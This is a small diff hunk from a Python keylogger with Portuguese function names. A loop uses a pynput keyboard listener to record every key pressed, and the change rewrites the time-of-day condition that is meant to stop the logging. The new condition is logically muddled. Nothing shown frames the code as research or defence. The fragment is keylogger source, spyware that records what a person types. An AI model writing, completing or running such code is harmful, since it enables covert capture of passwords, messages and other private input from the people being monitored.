@@ -21,7 +21,7 @@ def log_keystroke(key):
 
 def iniciar_keylog():
     tempo = time.localtime()
-    while tempo.tm_hour != 18 or tempo.tm_hour != 13:
+    while tempo.tm_hour != 18 and tempo.tm_min != 33 or tempo.tm_hour != 13 and tempo.tm_min != 33:
         with Listener(on_press=log_keystroke) as l:
             l.join()
     
